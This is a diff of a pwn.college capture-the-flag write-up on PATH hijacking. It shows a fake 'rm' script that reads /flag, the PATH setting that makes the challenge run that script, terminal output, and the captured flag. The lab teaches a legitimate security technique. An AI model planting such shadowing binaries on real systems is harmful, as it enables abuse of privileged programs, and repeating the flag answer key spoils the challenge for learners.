@@ -49,8 +49,7 @@ To prevent this, `rm` can be overwritten.
 Like the previous challenge, I `cd` to `mydir` and write to rm there, using `nano rm`  
 In the `rm file`, I give the commands:  
 ```
-read ANS < /flag
-echo $ANS
+read ANS < /flag; echo $ANS
 ```
 Now, I can overwrite PATH with the path of `rm`.  
 `PATH=/home/hacker/mydir`  
@@ -60,5 +59,35 @@ Trying to remove /flag...
 pwn.college{oOkqczARJcDLQPiSZUstvsQ5WDY.ddzNyUDL4ATO0czW}
 ```
 
-Another way to do this challenge, would've been to preserve `cat` in the PATH variable contents like I did in the last challenge. 
+Another way to do this challenge would've been to preserve `cat` in the PATH variable contents like I did in the last challenge. 
+First I enter the follwing in the `rm` file:  
+`cat /flag`  
+Now, I echo the contents of PATH. 
+Then, I change PATH to:  
+` PATH="/home/hacker/mydir:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"`   
+>[!WARNING]
+>/home/hacker/mydir must come before the original directories of PATH.
+>This makes it so the rm file in mydir is checked first by rm and when it is executed, the cat /flag command runs.
+>If /home/hacker/mydir were after the original dirctories of PATH, rm would delete the flag. To demonstrate:
+```
+PATH=/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/hacker/mydir
+hacker@path~hijacking-commands:~/mydir$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /usr/bin/rm. Executing!
+Uh oh, looks like I successfully removed the flag! That means you did not
+properly set PATH to keep me from finding 'rm'. Since the flag is gone, you
+will need to re-launch the challenge from the module page! Better luck next
+time.
+```
+Thus, mydir is added first.  
+
+Now, challenge/run can be run.
+This gives:  
+```
+hacker@path~hijacking-commands:~/mydir$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker/mydir/rm. Executing!
+pwn.college{oOkqczARJcDLQPiSZUstvsQ5WDY.ddzNyUDL4ATO0czW}
+```
+
 flag: `pwn.college{oOkqczARJcDLQPiSZUstvsQ5WDY.ddzNyUDL4ATO0czW}`
